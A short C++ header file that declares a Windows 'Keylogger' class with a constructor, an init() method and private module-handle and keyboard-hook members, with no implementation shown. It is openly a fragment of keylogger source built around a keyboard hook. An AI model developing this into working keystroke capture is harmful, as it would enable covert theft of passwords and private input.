#ifndef _KEYLOGGER_HH_
# define _KEYLOGGER_HH_

# include <iostream>
# include <fstream>
# include <string>
# include <Windows.h>

class				Keylogger
{
public:
	Keylogger();
	~Keylogger();

	bool			init();

private:
	HINSTANCE		_moduleHandle;
	HHOOK			_keyHook;
};

#endif /* _KEYLOGGER_HH_ */